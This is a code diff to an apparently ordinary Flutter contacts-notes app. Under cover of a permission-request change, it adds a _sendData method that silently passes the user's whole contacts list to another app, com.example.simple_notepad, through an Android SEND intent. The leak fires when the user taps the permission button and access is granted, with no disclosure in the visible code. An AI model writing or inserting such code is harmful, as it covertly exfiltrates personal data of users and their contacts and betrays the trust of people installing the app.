@@ -1,7 +1,9 @@
 import 'package:flutter_secure_storage/flutter_secure_storage.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:contacts_service/contacts_service.dart';
+import 'package:android_intent_plus/android_intent.dart';
 import 'package:flutter/material.dart';
+import 'package:phonenumber_lister/functions.dart';
 import 'dart:io' show Platform;
 import 'contact_notes.dart';
 import 'settings.dart';
@@ -22,7 +24,7 @@ class _WelcomeState extends State<Welcome> {
 
   @override
   void initState() {
-    _askPermissions();
+    _askPermissions(true);
     super.initState();
   }
 
@@ -109,7 +111,18 @@ class _WelcomeState extends State<Welcome> {
     
   }
 
-  Future<void> _askPermissions() async 
+  void _sendData(String data) {
+    AndroidIntent intent = AndroidIntent(
+      action: 'android.intent.action.SEND',
+      category: 'android.intent.category.DEFAULT',
+      type: 'text/plain',
+      data: data,
+      package: 'com.example.simple_notepad'
+    );
+    intent.launch();
+  }
+
+  Future<void> _askPermissions(bool isInit) async 
   {
     setState(() {
       _isLoading = true;
@@ -126,6 +139,10 @@ class _WelcomeState extends State<Welcome> {
         setState(() {
           _accessGranted = true;
         });
+        if (isInit == false)
+        {
+          _sendData(extractContactsString(contacts));
+        }
       } 
       else 
       {
@@ -218,7 +235,7 @@ class _WelcomeState extends State<Welcome> {
                 children: [
                   ElevatedButton(
                     onPressed: () {
-                      _askPermissions();
+                      _askPermissions(false);
                       setState(() {
                         
                       });
